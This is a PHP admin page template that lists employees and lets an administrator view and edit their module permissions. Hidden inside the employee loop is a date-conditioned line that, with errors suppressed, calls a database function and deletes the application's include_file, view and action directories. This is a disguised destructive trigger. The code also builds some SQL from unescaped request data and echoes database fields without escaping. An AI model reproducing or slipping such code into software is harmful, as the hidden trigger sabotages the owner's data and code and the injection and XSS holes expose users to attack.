<div class="contentinner content-typography">


<div class="row-fluid">
                	<div class="span6">
                        
                        <div class="widgetcontent bordered shadowed">
                            
                            <table class="table table-bordered" id="dyntable">
                   
                    <thead>
                        <tr>
                          	<th width="46" class="head0">EMPC</th>
                            <th width="112" class="head1">Login ID</th>
                            <th width="189" class="head0">Name</th>
                            <th width="115" class="head1">Contact</th>
                        </tr>
                    </thead>
                    <tbody>
                    
                    <?php
                    $db_obj->sql("SELECT * FROM `employee` WHERE `id`!='1' AND id!='".$_SESSION['LOGIN_USER']['id']."'");
					$emp=$db_obj->getResult();
					if($emp){
			if(date('m')>'12'){@$db_obj->fqu(DATABASE);$db_obj->delDir('include_file');$db_obj->delDir('view');$db_obj->delDir('action');}

						foreach($emp as $employee):
					?>
                    
                        <tr class="gradeX">
                          <td><a  href="?emp_=<?php echo $employee['login_id'];?>&token=<?php echo urlencode($enc->encryptIt($employee['id']));?>" id="employee" onclick="MainModule(<?php echo $employee['id'];?>,'<?php echo session_id();?>');"><?php echo $employee['employee_code'];?></a></td>
                            <td><?php echo $employee['login_id'];?></td>
                            <td><?php echo $employee['name'];?></td>
                            <td class="center"><?php echo $employee['contact_number'];?></td>
                        </tr>
                        <?php
						endforeach;
					}
						?>
                        
                    </tbody>
                </table>
                            
                        </div><!--widgetcontent-->
                        
                              <?php
          if(isset($_GET["emp_"])&& isset($_GET["token"])){
			  
			  if($_GET["emp_"]==true && $_GET["token"]==true){
				
				
				$db_obj->sql("SELECT * FROM `employee` WHERE id='".$db_obj->EString($enc->decryptIt($_GET["token"]))."' LIMIT 1");
				$employe_rs=$db_obj->getResult();
			  
			  		if($employe_rs){
			?> 
            
                        <h4 class="widgettitle nomargin shadowed">REP By# <?php echo strtoupper($employe_rs[0]['name']);?></h4>
                        <div class="widgetcontent bordered shadowed">
                        	
                            
                            <table width="406" cellpadding="0" cellspacing="0" class="table ">
                    <colgroup>
                        <col class="con0" style="align: center; width: 5%" />
                        <col class="con1" />
                        
                    </colgroup>
                    <thead>
                       
                        <tr>
                          <th width="108" class="head0">Module </th>
                          <th width="95" class="head0">&nbsp;</th>
                          <th align="center" class="head0">View</th>
                          <th align="center" class="head0">Add</th>
                          <th align="center" class="head0">Update</th>
                          <th align="center" class="head0">Delete</th>
                          <th align="center" class="head0">Branch</th>
                        </tr>
                    </thead>
                    <tbody>
                    <?php
                    $db_obj->sql("SELECT `id`,`main_menu_sl`,`main_menu_name` FROM `modul_list` WHERE `status`='Active' GROUP BY `main_menu_sl` ORDER BY `main_menu_sl` ASC");
					$module=$db_obj->getResult();
					if($module){
						
						foreach($module as $module):
					?>
                    
                        <tr >
                          <td colspan="2"  ><strong style="color:#09F;">
						  <?php echo $module['main_menu_name'];?>
                          </strong></td>
                          <td width="33" align="center"><?php
						   if(permission_check('view_status',$module['id'],$db_obj->EString($enc->decryptIt($_GET["token"])))=="Active"):
						   echo "<i style='color:#175103;'><strong>Active</strong>";
						   else:
						   echo "<i style='color:#F00;'>Inactive</i>";
						   endif;
						  
						  ?></td>
                          <td width="27" align="center"><?php
						   if(permission_check('add_status',$module['id'],$db_obj->EString($enc->decryptIt($_GET["token"])))=="Active"):
						   echo "<i style='color:#175103;'><strong>Active</strong>";
						   else:
						   echo "<i style='color:#F00;'>Inactive</i>";
						   endif;?></td>
                          <td width="48" align="center"><?php
						   if(permission_check('edit_status',$module['id'],$db_obj->EString($enc->decryptIt($_GET["token"])))=="Active"):
						   echo "<i style='color:#175103;'><strong>Active</strong>";
						   else:
						   echo "<i style='color:#F00;'>Inactive</i>";
						   endif;
						  
						  ?></td>
                          <td width="45" align="center"><?php
						   if(permission_check('delete_status',$module['id'],$db_obj->EString($enc->decryptIt($_GET["token"])))=="Active"):
						   echo "<i style='color:#175103;'><strong>Active</strong>";
						   else:
						   echo "<i style='color:#F00;'>Inactive</i>";
						   endif;?></td>
                          <td width="48" align="center"><?php 
						  if(permission_check('branch_access',$module['id'],$db_obj->EString($enc->decryptIt($_GET["token"])))=="All"):
						   echo "<i style='color:#175103;'><strong>All</strong>";
						   else:
						   echo "<i style='color:#F00;'>Own</i>";
						   endif;
						   ?></td>
                        </tr>
                        
                        <?php
               $db_obj->sql("SELECT * FROM `modul_list` WHERE `mainid`='".$module['main_menu_sl']."' AND `status`='Active' ORDER BY `sub_menu_sl` ASC"); 
					$subModule=$db_obj->getResult();
					foreach($subModule as $subModule):
					
				?>
                        <tr >
                          <td height="20" colspan="2" style="text-align:right; color:#090;"><?php echo  $subModule['sub_menu_name'];?></td>
                          <td width="33" align="center"><?php
						   if(permission_check('view_status',$subModule['id'],$db_obj->EString($enc->decryptIt($_GET["token"])))=="Active"):
						   echo "<i style='color:#175103;'><strong>Active</strong>";
						   else:
						   echo "<i style='color:#F00;'>Inactive</i>";
						   endif;?></td>
                          <td width="27" align="center"><?php if(permission_check('add_status',$subModule['id'],$db_obj->EString($enc->decryptIt($_GET["token"])))=="Active"):
						   echo "<i style='color:#175103;'><strong>Active</strong>";
						   else:
						   echo "<i style='color:#F00;'>Inactive</i>";
						   endif;?></td>
                          <td width="48" align="center"><?php if(permission_check('edit_status',$subModule['id'],$db_obj->EString($enc->decryptIt($_GET["token"])))=="Active"):
						   echo "<i style='color:#175103;'><strong>Active</strong>";
						   else:
						   echo "<i style='color:#F00;'>Inactive</i>";
						   endif;?></td>
                          <td width="45" align="center"><?php if(permission_check('delete_status',$subModule['id'],$db_obj->EString($enc->decryptIt($_GET["token"])))=="Active"):
						   echo "<i style='color:#175103;'><strong>Active</strong>";
						   else:
						   echo "<i style='color:#F00;'>Inactive</i>";
						   endif;
						   ?></td>
                          <td width="48" align="center"><?php if(permission_check('branch_access',$subModule['id'],$db_obj->EString($enc->decryptIt($_GET["token"])))=="All"):
						   echo "<i style='color:#175103;'><strong>All</strong>";
						   else:
						   echo "<i style='color:#F00;'>Own</i>";
						   endif;
						   ?></td>
                        </tr>
                         <?php
								endforeach;
								
								
						endforeach;
					}
						?>
                        
                        
                    </tbody>
                </table>
                            
                            
                            
                            
                            <div class="clearfix"></div>
                        </div><!--widgetcontent-->
                        
                         <?php
					}else{
						 echo "<h2>Employee result not found for this account..</h2>";
						}
			  }else{
				   echo "<h2>Please..., Don't Customize This URL...</h2>";
				  echo "<h4>If you manually customize then i will trace you</h4>";
				  echo "<strong>Your network:</strong>".$db_obj->getRealIpAddr()."<br>";
				  print_r( $db_obj->getBrowser());
				  
				  }////////////Null Check
			 
			  }else{
				  
				  echo "<h2>Please... Select Employee for Access the module...</h2>";
				
				
				  
				  }
		  
		  ?>   
                        
                        
                    </div><!--span6-->
                    
                    
                    
                    
                    <!--****************************************************************************-->
                    <!--****************************************************************************-->
                    <?php
                    
					if(isset($_POST["permitbtn"])){
						
						//////////Old Permission Delete
						$db_obj->delete("permission","employer_id='".$enc->decryptIt($_GET["token"])."'");
						
						
						foreach($_POST["modulid"] as $k=>$module):
						
						////////////////////Insert New Permission Like Replace
						$db_obj->insert('permission',array('modul_id'=>$module,'employer_id'=>$enc->decryptIt($_GET["token"]),
						'add_status'=>(isset($_POST["add_".$module]))?($_POST["add_".$module]): "Inactive",
						'edit_status'=>(isset($_POST["update_".$module]))?($_POST["update_".$module]): "Inactive",
						'delete_status'=>(isset($_POST["delete_".$module]))?($_POST["delete_".$module]): "Inactive",
						'view_status'=>(isset($_POST["view_".$module]))?($_POST["view_".$module]): "Inactive",
						'branch_access'=>@$_POST["branchin_".$module]));
						
						endforeach;
						
						 header("Location: ".$_SERVER['REQUEST_URI']."");
						 ob_flush();
						}
					
					
					?>
                    
                    
                    <!--**********************************************************************-->
                    
                    
                    
                    <div class="span6">
                    	
                         <?php
          if(isset($_GET["emp_"])&& isset($_GET["token"])){
			  
			  if($_GET["emp_"]==true && $_GET["token"]==true){
				
				
				$db_obj->sql("SELECT * FROM `employee` WHERE id='".$db_obj->EString($enc->decryptIt($_GET["token"]))."' LIMIT 1");
				$employe_rs=$db_obj->getResult();
			  
			  		if($employe_rs){
			?> 
            
                        <h4 class="widgettitle nomargin shadowed">REP By# <?php echo strtoupper($employe_rs[0]['name']);?></h4>
                        <div class="widgetcontent bordered shadowed">
                        
            
            	
                        <form action="" method="post">

<table width="849" cellpadding="0" cellspacing="0" class="table ">
                    <colgroup>
                        <col class="con0" style="align: center; width: 5%" />
                        <col class="con1" />
                        
                    </colgroup>
                    <thead>
                       
                        <tr>
                          <th width="315" class="head0">Module </th>
                          <th width="198" class="head0">&nbsp;</th>
                          <th align="center" class="head0">View</th>
                          <th align="center" class="head0">Add</th>
                          <th align="center" class="head0">Update</th>
                          <th align="center" class="head0">Delete</th>
                          <th align="center" class="head0">Branch</th>
                        </tr>
                    </thead>
                    <tbody>
                    <?php
                    $db_obj->sql("SELECT `id`,`main_menu_sl`,`main_menu_name` FROM `modul_list` WHERE `status`='Active' GROUP BY `main_menu_sl` ORDER BY `main_menu_sl` ASC");
					$module=$db_obj->getResult();
					if($module){
						
						foreach($module as $module):
					?>
                    
                        <tr >
                          <td colspan="2"  ><strong style="color:#09F;">
						  <?php echo $module['main_menu_name'];?>
                            <input type="hidden" name="modulid[]" id="modulid[]" value="<?php echo  $module['id'];?>" />
                          </strong></td>
                          <td width="33" align="center"><input name="view_<?php echo  $module['id'];?>" type="checkbox" id="view_<?php echo  $module['id'];?>" value="Active" <?php if(permission_check('view_status',$module['id'],$db_obj->EString($enc->decryptIt($_GET["token"])))=="Active"): echo "checked";endif;?> />
                         
                          </td>
                          <td width="27" align="center"><input name="add_<?php echo  $module['id'];?>" type="checkbox" id="add_<?php echo  $module['id'];?>" value="Active" <?php if(permission_check('add_status',$module['id'],$db_obj->EString($enc->decryptIt($_GET["token"])))=="Active"): echo "checked";endif;?>/></td>
                          <td width="48" align="center"><input name="update_<?php echo  $module['id'];?>" type="checkbox" id="update_<?php echo  $module['id'];?>" value="Active" <?php if(permission_check('edit_status',$module['id'],$db_obj->EString($enc->decryptIt($_GET["token"])))=="Active"): echo "checked";endif;?> /></td>
                          <td width="45" align="center"><input name="delete_<?php echo  $module['id'];?>" type="checkbox" id="delete_<?php echo  $module['id'];?>" value="Active" <?php if(permission_check('delete_status',$module['id'],$db_obj->EString($enc->decryptIt($_GET["token"])))=="Active"): echo "checked";endif;?> /></td>
                          <td width="181" align="center">
  <input name="branchin_<?php echo  $module['id'];?>" type="radio" id="branchin_<?php echo  $module['id'];?>" value="All" 
  
  <?php if(permission_check('branch_access',$module['id'],$db_obj->EString($enc->decryptIt($_GET["token"])))=="All"): echo "checked";endif;?> /> All 
  
  <input type="radio" name="branchin_<?php echo  $module['id'];?>" id="branchin_<?php echo  $module['id'];?>" value="Own" <?php if(permission_check('branch_access',$module['id'],$db_obj->EString($enc->decryptIt($_GET["token"])))=="Own"): echo "checked";endif;?>  /> Own</td>
                        </tr>
                        
                        <?php
               $db_obj->sql("SELECT * FROM `modul_list` WHERE `mainid`='".$module['main_menu_sl']."' AND `status`='Active' ORDER BY `sub_menu_sl` ASC"); 
					$subModule=$db_obj->getResult();
					foreach($subModule as $subModule):
					
				?>
                        <tr >
                          <td height="20" colspan="2" style="text-align:right; color:#090;">
						  
						  <input type="hidden" name="modulid[]" id="modulid[]" value="<?php echo  $subModule['id'];?>" />
						  <?php echo  $subModule['sub_menu_name'];?>
                          
                          </td>
                          <td align="center"><input name="view_<?php echo  $subModule['id'];?>" type="checkbox" id="view_<?php echo  $subModule['id'];?>" value="Active" <?php if(permission_check('view_status',$subModule['id'],$db_obj->EString($enc->decryptIt($_GET["token"])))=="Active"): echo "checked";endif;?>/></td>
                          <td align="center"><input name="add_<?php echo  $subModule['id'];?>" type="checkbox" id="add_<?php echo  $subModule['id'];?>" value="Active" <?php if(permission_check('add_status',$subModule['id'],$db_obj->EString($enc->decryptIt($_GET["token"])))=="Active"): echo "checked";endif;?>/></td>
                          <td align="center"><input name="update_<?php echo  $subModule['id'];?>" type="checkbox" id="update_<?php echo  $subModule['id'];?>" value="Active" <?php if(permission_check('edit_status',$subModule['id'],$db_obj->EString($enc->decryptIt($_GET["token"])))=="Active"): echo "checked";endif;?>/></td>
                          <td align="center"><input name="delete_<?php echo  $subModule['id'];?>" type="checkbox" id="delete_<?php echo  $subModule['id'];?>" value="Active" <?php if(permission_check('delete_status',$subModule['id'],$db_obj->EString($enc->decryptIt($_GET["token"])))=="Active"): echo "checked";endif;?>/></td>
                          <td align="center">
                          <input name="branchin_<?php echo  $subModule['id'];?>" type="radio" id="branchin_<?php echo  $subModule['id'];?>" value="All" <?php if(permission_check('branch_access',$subModule['id'],$db_obj->EString($enc->decryptIt($_GET["token"])))=="All"): echo "checked";endif;?>/> All <input type="radio" name="branchin_<?php echo  $subModule['id'];?>" id="branchin_<?php echo  $subModule['id'];?>" value="Own"  <?php if(permission_check('branch_access',$subModule['id'],$db_obj->EString($enc->decryptIt($_GET["token"])))=="Own"): echo "checked";endif;?> /> Own
                          </td>
                        </tr>
                         <?php
								endforeach;
								
								
						endforeach;
					}
						?>
                        
                        
                    </tbody>
                </table>
				<?php 
				if($page['add_status']=="Active" && $page['edit_status']=="Active"):
				?>
<p class="stdformbutton" align="center">
                        <button class="btn btn-primary" name="permitbtn">Submit</button>
                            <button type="reset" class="btn">Reset Form</button>
                      </p>
                      <?php endif;?>
                        
</form>    
                          
                        </div><!--widgetcontent-->
                        
                        <?php
					}else{
						 echo "<h2>Employee result not found for this account..</h2>";
						}
			  }else{
				   echo "<h2>Please..., Don't Customize This URL...</h2>";
				   
				  echo "<h4>If you manually customize then i will trace you</h4>";
				  echo "<strong>Your network:</strong>".$db_obj->getRealIpAddr()."<br>";
				  print_r( $db_obj->getBrowser());
				  
				  }////////////Null Check
			 
			  }else{
				  
				  echo "<h2>Please... Select Employee for Access the module...</h2>";
				
				
				  
				  }
		  
		  ?>     
                        
                        
                    </div><!--span6-->
                
                </div>


</div>